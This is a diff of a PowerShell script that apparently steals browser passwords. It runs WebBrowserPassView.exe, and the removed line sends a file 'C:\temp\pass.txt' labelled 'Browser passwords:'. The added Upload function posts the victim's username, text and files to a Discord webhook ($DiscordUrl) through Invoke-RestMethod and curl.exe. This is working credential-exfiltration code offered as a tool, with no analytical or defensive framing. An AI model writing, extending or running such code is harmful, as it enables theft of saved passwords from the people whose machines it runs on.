@@ -23,14 +23,26 @@ function Delete {
 
 
 
+function Upload {
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
 
 
-function Upload{
-Upload-Discord -file "C:\temp\pass.txt" -text "Browser passwords:"
+$Body = @{
+  'username' = $env:username
+  'content' = $text
 }
 
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl  -Method Post -Body ($Body | ConvertTo-Json)};
 
-
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $DiscordUrl}
+}
 
 function Open{
 .\WebBrowserPassView.exe
